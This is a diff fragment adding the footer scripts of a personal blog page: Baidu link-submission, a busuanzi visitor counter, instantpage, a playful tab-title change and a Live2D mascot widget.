+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/instantpage/instantpage.js" type="module"></script>
+    
+    <script type="text/javascript">
+    var OriginTitile=document.title,st;
+    document.addEventListener("visibilitychange",function(){
+        document.hidden?(document.title="ヽ(●-`Д´-)ノ404啦",clearTimeout(st)):(document.title="(Ő∀Ő3)ノ骗你的嘿嘿！",st=setTimeout(function(){document.title=OriginTitile},3e3))
+    })
+
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
